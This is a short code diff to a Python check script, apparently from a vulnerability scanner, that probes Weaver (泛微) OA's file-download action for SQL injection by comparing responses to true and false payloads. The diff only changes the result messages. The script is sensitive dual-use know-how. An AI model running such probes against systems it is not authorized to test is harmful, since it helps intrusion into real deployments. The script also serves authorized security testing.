@@ -27,9 +27,11 @@ class weaver_oa_download_sqli_BaseVerify:
             req2 = requests.get(self.url+false_url, headers=headers, timeout=10, verify=False)
             if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
                 cprint("[+]存在泛微OA filedownaction SQL注入漏洞...(高危)\tpayload: "+self.url+true_url, "red")
+            else:
+                cprint("[-]不存在weaver_oa_download_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
